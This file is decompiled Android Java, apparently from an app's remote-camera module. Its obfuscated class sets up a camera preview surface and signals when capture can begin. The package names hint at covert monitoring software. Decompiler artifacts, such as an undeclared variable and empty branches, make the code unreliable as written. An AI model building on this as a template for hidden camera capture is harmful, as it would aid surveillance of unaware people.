package com.remote.camera.normal;

import android.content.Context;
import android.hardware.Camera;
import android.os.ConditionVariable;
import android.view.SurfaceHolder;
import android.view.SurfaceHolder.Callback;
import android.view.SurfaceView;

public class a
  extends SurfaceView
  implements SurfaceHolder.Callback
{
  private static final boolean b = com.vvt.ak.a.a;
  private static final boolean c = com.vvt.ak.a.e;
  public ConditionVariable a;
  private SurfaceHolder d;
  private Camera e;
  
  public a(Context paramContext, Camera paramCamera, ConditionVariable paramConditionVariable)
  {
    super(paramContext);
    boolean bool = b;
    if (bool) {}
    this.e = paramCamera;
    this.a = paramConditionVariable;
    SurfaceHolder localSurfaceHolder = getHolder();
    this.d = localSurfaceHolder;
    this.d.setFormat(-2);
    this.d.addCallback(this);
    localSurfaceHolder = this.d;
    int i = 3;
    localSurfaceHolder.setType(i);
    bool = b;
    if (bool) {}
  }
  
  public void surfaceChanged(SurfaceHolder paramSurfaceHolder, int paramInt1, int paramInt2, int paramInt3)
  {
    bool = b;
    if (bool) {}
    Object localObject = this.d.getSurface();
    if (localObject == null) {}
    for (;;)
    {
      return;
      for (;;)
      {
        try
        {
          bool = b;
          if (bool) {}
          localObject = this.e;
          ((Camera)localObject).stopPreview();
        }
        catch (Exception localException2)
        {
          SurfaceHolder localSurfaceHolder;
          continue;
        }
        try
        {
          bool = b;
          if (bool) {}
          localObject = this.e;
          localSurfaceHolder = this.d;
          ((Camera)localObject).setPreviewDisplay(localSurfaceHolder);
          localObject = this.e;
          ((Camera)localObject).startPreview();
          bool = b;
          if (bool) {}
          localObject = this.a;
          ((ConditionVariable)localObject).open();
        }
        catch (Exception localException1)
        {
          bool = c;
          if (!bool) {
            continue;
          }
        }
      }
      bool = b;
      if (!bool) {}
    }
  }
  
  public void surfaceCreated(SurfaceHolder paramSurfaceHolder)
  {
    bool = b;
    if (bool) {}
    try
    {
      Object localObject = this.e;
      ((Camera)localObject).setPreviewDisplay(paramSurfaceHolder);
      localObject = this.e;
      ((Camera)localObject).startPreview();
      localObject = this.a;
      ((ConditionVariable)localObject).open();
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = c;
        if (!bool) {}
      }
    }
    bool = b;
    if (bool) {}
  }
  
  public void surfaceDestroyed(SurfaceHolder paramSurfaceHolder) {}
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/remote/camera/normal/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */